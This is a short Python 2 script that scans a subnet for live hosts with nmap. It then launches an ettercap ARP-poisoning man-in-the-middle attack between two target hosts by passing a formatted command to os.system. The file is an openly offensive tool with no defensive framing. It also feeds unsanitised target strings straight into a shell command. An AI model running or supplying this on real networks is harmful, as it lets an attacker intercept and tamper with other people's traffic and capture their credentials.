# encoding=utf-8

import nmap
import os

CMD='ettercap -i eth0 -Tq -M arp:remote //{}// //{}//'

def scanHost(subnet):
    nm=nmap.PortScanner()
    nm.scan(hosts=subnet,arguments='-n -sP -PE -PA21,23,80,3389')
    print 'All host in the network %s' %subnet
    for host in nm.all_hosts():
        print host

def do_arp(t1,t2):
    c1=CMD.format(t1,t2)
    print c1
    os.system(c1)

